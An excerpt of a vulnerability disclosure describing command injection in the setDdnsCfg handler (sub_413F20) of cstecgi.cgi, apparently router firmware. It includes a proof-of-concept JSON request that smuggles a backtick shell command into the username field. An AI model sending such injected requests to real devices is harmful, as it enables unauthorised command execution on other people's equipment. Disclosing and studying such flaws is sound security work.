...
The vulnerability is located in the function `sub_413F20` within `cstecgi.cgi`, also known as `setDdnsCfg`.

![](Pasted%20image%2020231130004352.png)
...
therefore , by controlling parameter among `provider,domain,username,password` , we can finally make an arbitrary command execution
...
{"enable":"1","provider":"oray.com","username":"`id > /1.txt;`","topicurl":"setDdnsCfg","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231130004624.png)